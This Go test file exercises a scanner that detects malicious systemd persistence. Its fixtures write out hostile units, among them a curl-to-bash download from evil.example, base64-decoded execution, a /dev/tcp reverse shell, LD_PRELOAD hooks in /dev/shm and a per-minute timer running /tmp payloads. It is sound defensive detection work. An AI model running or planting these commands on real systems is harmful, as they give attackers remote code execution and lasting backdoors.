package persistence

import (
	"strings"
	"testing"

	"github.com/Lutfifakee-Project/ronda/internal/finding"
)

func TestSystemdLegitimateVendorServiceNoFindings(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.addGroups()
	f.writeExecutable("/usr/sbin/nginx", "\x7fELF-binary-placeholder")
	f.write("/usr/lib/systemd/system/nginx.service", `[Unit]
Description=A high performance web server
After=network.target

[Service]
Type=forking
PIDFile=/run/nginx.pid
ExecStartPre=/usr/sbin/nginx -t -c /etc/nginx/nginx.conf
ExecStart=/usr/sbin/nginx
ExecReload=/usr/sbin/nginx -s reload

[Install]
WantedBy=multi-user.target
`)
	f.symlink("/etc/systemd/system/multi-user.target.wants/nginx.service", "/usr/lib/systemd/system/nginx.service")

	rep := f.scan()
	for _, fl := range rep.Findings {
		if fl.Severity.Rank() >= finding.Medium.Rank() {
			t.Fatalf("legitimate vendor unit produced %s finding: %s (%s)", fl.Severity, fl.Title, fl.Evidence)
		}
	}
}

func TestSystemdCustomAdminServiceNoFindings(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/opt/app/server", "script")
	f.write("/etc/systemd/system/myapp.service", `[Unit]
Description=My application

[Service]
ExecStart=/opt/app/server --port 8080
User=svc
Restart=on-failure

[Install]
WantedBy=multi-user.target
`)
	rep := f.scan()
	countRule(t, rep, "systemd-exec-writable-path", 0)
	countRule(t, rep, "systemd-exec-hidden-path", 0)
	countRule(t, rep, "systemd-download-exec", 0)
}

func TestSystemdExecFromTmp(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/tmp/.x/pay", "script")
	f.write("/etc/systemd/system/update-check.service", `[Unit]
Description=Update check

[Service]
ExecStart=/tmp/.x/pay --check

[Install]
WantedBy=multi-user.target
`)
	rep := f.scan()
	countRule(t, rep, "systemd-exec-writable-path", 1)
	fl := findingsByRule(rep)["systemd-exec-writable-path"][0]
	if fl.Severity != finding.High {
		t.Errorf("writable-path execution should be HIGH, got %s", fl.Severity)
	}
	if fl.Target != "/tmp/.x/pay" {
		t.Errorf("target = %q", fl.Target)
	}
}

func TestSystemdDownloadExecChain(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/systemd/system/bootstrap.service", `[Unit]
Description=Bootstrap

[Service]
ExecStart=/bin/sh -c "curl -fsSL http://evil.example/i.sh | bash"
`)
	rep := f.scan()
	countRule(t, rep, "systemd-download-exec", 1)
	fl := findingsByRule(rep)["systemd-download-exec"][0]
	if fl.Line != 5 {
		t.Errorf("evidence line = %d, want 5", fl.Line)
	}
	if strings.Contains(fl.Evidence, "password=") {
		t.Errorf("evidence must be redacted")
	}
}

func TestSystemdEncodedExecution(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/systemd/system/decode.service", `[Service]
ExecStart=/bin/bash -c "echo aGVsbG8= | base64 -d | bash"
`)
	rep := f.scan()
	countRule(t, rep, "systemd-obfuscated-exec", 1)
}

func TestSystemdReverseShell(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/systemd/system/rev.service", `[Service]
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.1.2.3/4444 0>&1"
`)
	rep := f.scan()
	countRule(t, rep, "systemd-reverse-shell", 1)
	fl := findingsByRule(rep)["systemd-reverse-shell"][0]
	if fl.Severity != finding.Critical {
		t.Errorf("reverse shell must be CRITICAL, got %s", fl.Severity)
	}
}

func TestSystemdLDPreloadEnvironment(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/usr/lib/systemd/system/instr.service", `[Service]
Environment=LD_PRELOAD=/usr/lib/libprofiler.so
ExecStart=/usr/bin/app
`)
	f.write("/usr/lib/libprofiler.so", "\x7fELF-placeholder")
	f.write("/etc/systemd/system/evil.service", `[Service]
Environment=LD_PRELOAD=/dev/shm/hook.so
ExecStart=/usr/bin/app
`)
	f.write("/dev/shm/hook.so", "\x7fELF-placeholder")

	rep := f.scan()
	countRule(t, rep, "systemd-ldpreload-env", 2)
	var high, info int
	for _, fl := range findingsByRule(rep)["systemd-ldpreload-env"] {
		switch fl.Severity {
		case finding.High:
			high++
		case finding.Info:
			info++
		}
	}
	if high != 1 || info != 1 {
		t.Fatalf("expected one HIGH (writable lib) and one INFO (package dir), got HIGH=%d INFO=%d", high, info)
	}
}

func TestSystemdEnvironmentFileSuspicious(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/systemd/system/app.service", `[Service]
EnvironmentFile=/dev/shm/env.conf
ExecStart=/usr/bin/app
`)
	f.write("/dev/shm/env.conf", "KEY=value\n")
	rep := f.scan()
	countRule(t, rep, "systemd-envfile-suspicious", 1)
}

func TestSystemdTimerSuspiciousActivation(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/tmp/.cron/pay.sh", "script")
	f.write("/etc/systemd/system/pay.service", `[Service]
ExecStart=/tmp/.cron/pay.sh
`)
	f.write("/etc/systemd/system/pay.timer", `[Unit]
Description=Payload timer

[Timer]
OnCalendar=*-*-* *:*:00
Unit=pay.service

[Install]
WantedBy=timers.target
`)
	rep := f.scan()
	countRule(t, rep, "systemd-timer-suspicious", 1)
	countRule(t, rep, "systemd-exec-writable-path", 1)
}

func TestSystemdLegitimateTimerNoFindings(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/usr/bin/logrotate", "elf")
	f.write("/usr/lib/systemd/system/logrotate.service", `[Service]
Type=oneshot
ExecStart=/usr/bin/logrotate /etc/logrotate.conf
`)
	f.write("/usr/lib/systemd/system/logrotate.timer", `[Timer]
OnCalendar=daily
Unit=logrotate.service
`)
	rep := f.scan()
	countRule(t, rep, "systemd-timer-suspicious", 0)
}

func TestSystemdEnablementSymlinkEscape(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/systemd/system/ok.service", "[Service]\nExecStart=/usr/bin/x\n")
	// Relative symlink escaping the scanned root (absolute targets inside an
	// offline root are root-relative by convention).
	f.symlink("etc/systemd/system/multi-user.target.wants/escape.service", "../../../../../outside-root")
	rep := f.scan()
	countRule(t, rep, "systemd-symlink-escape", 1)
}

func TestSystemdDropInOverride(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/usr/lib/systemd/system/base.service", "[Service]\nExecStart=/usr/bin/app\n")
	f.write("/etc/systemd/system/base.service.d/override.conf", "[Service]\nExecStart=\nExecStart=/var/tmp/replacement\n")
	f.writeExecutable("/var/tmp/replacement", "script")
	rep := f.scan()
	countRule(t, rep, "systemd-exec-writable-path", 1)
	fl := findingsByRule(rep)["systemd-exec-writable-path"][0]
	if !strings.HasSuffix(fl.Path, "override.conf") {
		t.Errorf("finding should attribute to the drop-in, got %q", fl.Path)
	}
}

func TestSystemdMissingTarget(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.write("/etc/systemd/system/gone.service", `[Service]
ExecStart=/opt/removed/binary
`)
	rep := f.scan()
	countRule(t, rep, "systemd-missing-target", 1)
	fl := findingsByRule(rep)["systemd-missing-target"][0]
	if fl.Severity != finding.Low {
		t.Errorf("missing target is a weak indicator, got %s", fl.Severity)
	}
}

func TestSystemdUserUnitAnalyzed(t *testing.T) {
	f := newFixtureRoot(t)
	f.addPasswd()
	f.writeExecutable("/tmp/.u/pay", "script")
	f.write("/home/ubuntu/.config/systemd/user/refresh.service", `[Service]
ExecStart=/tmp/.u/pay
`)
	rep := f.scan()
	countRule(t, rep, "systemd-exec-writable-path", 1)
	fl := findingsByRule(rep)["systemd-exec-writable-path"][0]
	if fl.User != "ubuntu" {
		t.Errorf("user-level finding should attribute User=ubuntu, got %q", fl.User)
	}
}
